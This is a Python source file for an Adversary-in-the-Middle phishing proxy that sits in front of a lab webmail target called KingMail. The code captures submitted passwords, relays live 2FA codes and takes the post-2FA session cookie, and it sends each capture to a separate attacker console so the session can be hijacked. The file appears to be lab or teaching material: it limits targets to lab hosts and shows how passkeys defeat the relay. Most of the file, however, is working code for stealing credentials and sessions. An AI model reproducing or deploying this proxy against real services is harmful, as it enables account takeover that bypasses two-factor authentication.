"""
KINGNET proxy — the Adversary-in-the-Middle (AiTM) engine.

It sits between the victim's browser and a LAB target (KingMail) as a transparent
reverse proxy. As traffic flows through, it:
  1) captures submitted credentials (the /login POST),
  2) captures + relays the live 2FA code (the /otp POST),  -> defeats TOTP/SMS 2FA
  3) captures the real session cookie the target sets after 2FA,  -> the real prize
and forwards everything so the victim notices nothing. The attacker-console then
replays that cookie to hijack the session — exactly how real AiTM phishing works.

SAFETY (hard guardrail): the upstream target is a SINGLE, fixed lab address and is
refused unless it is a loopback / private / *.lab host. There is deliberately NO
way to point this at an arbitrary real site. Lab-only, by construction.
"""
import base64
import ipaddress
import json
import os
import socket
import time
import uuid
from urllib.parse import urlparse

import httpx
from fastapi import FastAPI, Request
from fastapi.responses import Response

TARGET_URL = os.environ.get("TARGET_URL", "http://localhost:8081").rstrip("/")
PROXY_PUBLIC_URL = os.environ.get("PROXY_PUBLIC_URL", "http://localhost:8443").rstrip("/")
CONSOLE_URL = os.environ.get("CONSOLE_URL", "http://localhost:9000").rstrip("/")
TRACK_COOKIE = "kn_track"
SESSION_COOKIE_NAME = os.environ.get("SESSION_COOKIE_NAME", "kingmail_session")
HOP_BY_HOP = {"connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
              "te", "trailers", "transfer-encoding", "upgrade", "content-length", "content-encoding"}


def _assert_lab_only(url: str):
    """Refuse to run against anything that isn't a lab host (loopback/private/.lab)."""
    host = urlparse(url).hostname or ""
    if host.endswith(".lab") or host in ("localhost", "kingmail"):
        return
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(host))
        if ip.is_loopback or ip.is_private:
            return
    except Exception:
        pass
    raise RuntimeError(
        f"KINGNET refuses to start: target '{host}' is not a lab host. "
        "This tool is lab-only and must not proxy real/public services."
    )


_assert_lab_only(TARGET_URL)
app = FastAPI(title="KINGNET AiTM proxy (lab-only)")
client = httpx.AsyncClient(follow_redirects=False, timeout=20.0)


async def _send_capture(kind: str, track: str, data: dict):
    try:
        await client.post(f"{CONSOLE_URL}/api/capture",
                          json={"kind": kind, "track": track, "data": data, "ts": time.time()})
    except Exception:
        pass  # console being down must never break the proxy


@app.on_event("shutdown")
async def _close():
    await client.aclose()


@app.api_route("/{path:path}", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"])
async def proxy(request: Request, path: str):
    track = request.cookies.get(TRACK_COOKIE) or uuid.uuid4().hex[:12]
    body = await request.body()

    # ---- forward request to the real lab target ----
    up_headers = {k: v for k, v in request.headers.items() if k.lower() not in HOP_BY_HOP | {"host"}}
    up_headers["host"] = urlparse(TARGET_URL).netloc
    url = f"{TARGET_URL}/{path}"
    upstream = await client.request(request.method, url, params=request.query_params,
                                    headers=up_headers, content=body)

    # ---- CAPTURE: credentials, 2FA code, session cookie ----
    form = {}
    if request.method == "POST" and b"=" in body:
        try:
            from urllib.parse import parse_qs
            form = {k: v[0] for k, v in parse_qs(body.decode("utf-8", "ignore")).items()}
        except Exception:
            form = {}
    if path == "login" and ("password" in form):
        await _send_capture("credentials", track,
                            {"username": form.get("email", ""), "password": form.get("password", "")})
    if path == "otp" and ("code" in form):
        await _send_capture("otp", track, {"code": form.get("code", "")})

    stolen_cookie = None
    for name, value in upstream.headers.multi_items():
        if name.lower() == "set-cookie" and value.startswith(SESSION_COOKIE_NAME + "="):
            stolen_cookie = value.split(";", 1)[0].split("=", 1)[1]
    if stolen_cookie:
        await _send_capture("session_cookie", track,
                            {"cookie_name": SESSION_COOKIE_NAME, "cookie_value": stolen_cookie,
                             "note": "Full post-2FA session token — replay = account takeover"})

    # ---- CAPTURE (passkey lesson): a WebAuthn assertion relayed through the proxy ----
    # We can grab the bytes, but a passkey is bound to the origin the victim's browser
    # was on (ours, the phishing origin), so the real service refuses it. Record the
    # attempt + the target's verdict so the attacker console shows WHY it failed.
    if path.endswith("login/complete") and request.method == "POST":
        try:
            payload = json.loads(body.decode("utf-8", "ignore"))
            # standard WebAuthn: credential.response.clientDataJSON; (older flat shape kept too)
            cdj = (payload.get("client_data_json")
                   or payload.get("credential", {}).get("response", {}).get("clientDataJSON", ""))
            bound = None
            if cdj:
                bound = json.loads(base64.urlsafe_b64decode(cdj + "=" * (-len(cdj) % 4))).get("origin")
            accepted = upstream.status_code == 200
            await _send_capture("webauthn_assertion", track, {
                "bound_origin": bound,
                "rp_status": upstream.status_code,
                "verdict": ("ACCEPTED — replayable (origin binding was NOT enforced!)" if accepted
                            else "REJECTED — passkey is bound to the phishing origin; the stolen "
                                 "assertion is useless against the real service"),
            })
        except Exception:
            pass

    # ---- build the response back to the victim (stay on the proxy origin) ----
    # Set-Cookie must be forwarded one header per cookie: a plain dict would
    # collapse multiple cookies (e.g. the post-2FA response both sets the session
    # cookie and clears the pending one) down to the last one, so the victim would
    # never actually get logged in. Keep them separate and re-emit each verbatim.
    out_headers = {}
    set_cookies = []
    for name, value in upstream.headers.multi_items():
        ln = name.lower()
        if ln in HOP_BY_HOP:
            continue
        if ln == "set-cookie":
            set_cookies.append(value)
            continue
        if ln == "location":  # keep the victim on the phishing origin
            value = value.replace(TARGET_URL, PROXY_PUBLIC_URL)
        out_headers[name] = value

    content = upstream.content
    ctype = upstream.headers.get("content-type", "")
    if "text/html" in ctype:  # rewrite any absolute target links -> proxy
        content = upstream.content.replace(TARGET_URL.encode(), PROXY_PUBLIC_URL.encode())

    resp = Response(content=content, status_code=upstream.status_code, headers=out_headers)
    for cookie in set_cookies:  # forward every Set-Cookie intact
        resp.raw_headers.append((b"set-cookie", cookie.encode("latin-1")))
    if not request.cookies.get(TRACK_COOKIE):
        resp.set_cookie(TRACK_COOKIE, track, httponly=True, samesite="lax")
    return resp
